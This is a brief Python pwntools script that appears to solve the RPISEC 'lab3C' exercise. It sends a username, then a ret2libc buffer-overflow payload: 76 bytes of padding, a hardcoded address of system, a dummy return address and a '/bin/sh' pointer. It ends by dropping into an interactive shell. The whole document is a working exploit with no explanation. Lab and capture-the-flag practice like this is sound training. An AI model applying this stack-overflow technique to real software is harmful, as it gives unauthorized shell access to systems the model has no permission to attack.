from pwn import *


binsh = p32(0xf7f53363)
system = p32(0xf7e06780)
s= process(["./lab3C"])
s.sendline(b"rpisec")
payload = b"a"*76 + b"bbbb" + system + b"aaaa" + binsh
s.sendline(payload)
s.interactive()
